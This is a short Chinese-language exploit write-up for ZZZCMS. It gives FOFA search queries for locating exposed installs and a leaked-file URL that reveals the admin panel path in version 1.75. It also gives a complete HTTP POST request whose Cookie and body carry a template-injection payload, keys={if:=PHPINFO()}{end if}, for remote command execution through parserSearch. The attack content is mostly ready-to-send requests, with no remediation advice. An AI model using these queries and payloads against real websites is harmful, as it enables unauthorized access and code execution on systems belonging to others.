# FOFA：

```
app="Zzzcms"
```



# **Zzzcms 1.75** **后台地址泄露**

## **一、漏洞影响**

Zzzcms 1.75

## **二、复现过程**

存在一个比较奇葩的文件直接将一些属于不可访问的zzz_config.php的内容直接给回显了，该信息泄露文件位于plugins/webuploader/js/webconfig.php，可以直接获取到管理后台的管理路径名称，再也不用去爆破admin加3位数字了

通过访问[http://xxxx/plugins/webuploader/js/webconfig.php]()即可获取后台路径

![image-20220718120157582](https://0-bit.oss-cn-beijing.aliyuncs.com/cuer/image-20220718120157582.png)

---

# ZZZCMS parserSearch 远程命令执行漏洞

## 漏洞描述

ZZZCMS parserSearch 存在模板注入导致远程命令执行漏洞

## 漏洞影响

```
ZZZCMS
```

## FOFA

```
app="zzzcms"
```

## 漏洞复现

```
POST /?location=search HTTP/1.1
Host: 
Content-Length: 30
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: text/plain
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=rbuhrqqhoctntnak8slkascqp1; keys=%7Bif%3A%3DPHPINFO%28%29%7D%7Bend+if%7D%0D%0A


keys={if:=PHPINFO()}{end if}
```
